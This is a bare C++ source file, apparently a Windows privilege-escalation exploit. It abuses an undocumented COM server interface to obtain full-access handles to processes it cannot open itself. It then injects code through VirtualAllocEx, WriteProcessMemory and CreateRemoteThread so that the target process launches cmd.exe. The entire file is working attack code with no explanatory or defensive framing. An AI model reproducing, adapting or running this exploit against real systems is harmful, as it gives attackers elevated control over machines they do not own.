#include <stdio.h>
#include <windows.h>
#include <hstring.h>
#include <cstdio>
#include <cstdlib>
#include <iostream>
#include <string>
#include <string.h>
#include <windows.h>
#include <strsafe.h>
#include <tlhelp32.h>
#define MAX_LENGTH 50
#define NORMAL_LENGTH 20
#pragma warning(disable:4996)

using namespace std;

class __declspec(uuid("e3a475cf-34ea-4e9a-9f3e-48ce5c6e4e57")) ITaskCompletionCallback : public IUnknown {
public:
    virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ INT64 p0, /* Stack Offset: 16 */ /* ENUM32 */ INT32 p1);
};

class __declspec(uuid("27eb33a5-77f9-4afe-ae05-6fdbbe720ee7")) ICOMServerRegistrar : public IUnknown {
public:
    virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ GUID* p0, /* Stack Offset: 16 */ IUnknown* p1, /* Stack Offset: 24 */ INT64* p2);
    virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ INT64 p0);
    virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ INT64 p0, /* Stack Offset: 16 */ INT64 p1, /* Stack Offset: 24 */ INT64 p2, /* Stack Offset: 32 */ INT64* p3, /* Stack Offset: 40 */ INT64 p4, /* Stack Offset: 48 */ INT64 p5, /* Stack Offset: 56 */ INT64 p6);
    virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ INT64 p0, /* Stack Offset: 16 */ INT64 p1, /* Stack Offset: 24 */ INT64 p2, /* Stack Offset: 32 */ INT64 p3, /* Stack Offset: 40 */ INT64* p4);
    virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ INT64 p0, /* Stack Offset: 16 */ HSTRING* p1);
    virtual HRESULT __stdcall Proc8(/* Stack Offset: 8 */ HWND p0, /* Stack Offset: 16 */ GUID* p1, /* Stack Offset: 24 */ IUnknown** p2);
    virtual HRESULT __stdcall Proc9(/* Stack Offset: 8 */ HWND p0, /* Stack Offset: 16 */ HWND p1, /* Stack Offset: 24 */ GUID* p2, /* Stack Offset: 32 */ IUnknown** p3);
    virtual HRESULT __stdcall Proc10(/* Stack Offset: 8 */ INT64 p0, /* Stack Offset: 16 */ INT64* p1);
    virtual HRESULT __stdcall Proc11(/* Stack Offset: 8 */ INT64 p0, /* Stack Offset: 16 */ ITaskCompletionCallback* p1, /* Stack Offset: 24 */ /* ENUM32 */ INT32 p2, /* Stack Offset: 32 */ INT64* p3);
    virtual HRESULT __stdcall Proc12(/* Stack Offset: 8 */ INT64 p0);
};

ICOMServerRegistrar* pICOMServerRegistrar;

UUID clsid;

typedef struct _RemoteParam
{
    CHAR szOperation[NORMAL_LENGTH];
    CHAR szAddrerss[MAX_LENGTH];
    CHAR szLb[NORMAL_LENGTH];
    CHAR szFunc[NORMAL_LENGTH];
    LPVOID dwMLAAdress;
    LPVOID dwMGPAAddress;
    LPVOID dwSEAddress;
}RemoteParam;

DWORD WINAPI ThreadProc(RemoteParam* lprp)
{
    typedef HMODULE(WINAPI* MLoadLibraryA)(IN LPCTSTR lpFileName);

    typedef FARPROC(WINAPI* MGetProcAddress)(IN HMODULE hModule, IN LPCSTR lpProcName);

    typedef HINSTANCE(WINAPI* MShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);

    MLoadLibraryA MLA;

    MGetProcAddress MGPA;

    MShellExecuteA MSE;

    MLA = (MLoadLibraryA)lprp->dwMLAAdress;

    MGPA = (MGetProcAddress)lprp->dwMGPAAddress;

    lprp->dwSEAddress = (LPVOID)MGPA(MLA(lprp->szLb), lprp->szFunc);

    MSE = (MShellExecuteA)lprp->dwSEAddress;

    MSE(NULL, lprp->szOperation, lprp->szAddrerss, NULL, NULL, SW_SHOWNORMAL);

    return 0;
}


BOOL InjectProcess(HANDLE hd)
{
    HANDLE hWnd = hd;

    if (!hWnd) return FALSE;

    RemoteParam rp;

    ZeroMemory(&rp, sizeof(RemoteParam));

    rp.dwMLAAdress = (LPVOID)GetProcAddress(LoadLibraryA("Kernel32.dll"), "LoadLibraryA");

    rp.dwMGPAAddress = (LPVOID)GetProcAddress(LoadLibraryA("Kernel32.dll"), "GetProcAddress");

    StringCchCopyA(rp.szLb, sizeof(rp.szLb), "Shell32.dll");

    StringCchCopyA(rp.szFunc, sizeof(rp.szFunc), "ShellExecuteA");

    StringCchCopyA(rp.szAddrerss, sizeof(rp.szAddrerss), "cmd.exe");

    StringCchCopyA(rp.szOperation, sizeof(rp.szOperation), "open");

    RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(hWnd, 0, sizeof(RemoteParam), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pRemoteParam) return FALSE;

    if (!WriteProcessMemory(hWnd, pRemoteParam, &rp, sizeof(RemoteParam), 0)) return FALSE;

    LPVOID pRemoteThread = VirtualAllocEx(hWnd, 0, 1024 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pRemoteThread) return FALSE;

    if (!WriteProcessMemory(hWnd, pRemoteThread, &ThreadProc, 1024 * 4, 0)) return FALSE;
    HANDLE hThread = CreateRemoteThread(hWnd, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, (LPVOID)pRemoteParam, 0, NULL);

    if (!hThread) return FALSE;

    return TRUE;
}

int main(int argc, char* argv[]) {

    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    CLSIDFromString(L"{54E14197-88B0-442F-B9A3-86837061E2FB}", &clsid);

    HANDLE hTargetHandle = 0;

    HRESULT hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, __uuidof(pICOMServerRegistrar), (LPVOID*)&pICOMServerRegistrar);

    if (!hr)
    {
        for (size_t i = 0; i < 123456; i++)
        {
            if (!OpenProcess(PROCESS_ALL_ACCESS, FALSE, i))
            {
                pICOMServerRegistrar->Proc6(PROCESS_ALL_ACCESS,
                    FALSE,
                    i,
                    (INT64)GetCurrentProcessId(),
                    (INT64*)&hTargetHandle
                );

                if (hTargetHandle != 0)
                {
                    InjectProcess(hTargetHandle);
                    return 0;
                }
            };
        }
    }
    else
    {
        printf("CoCreateInstance Error %x ", hr);
    }

    return 0;
}
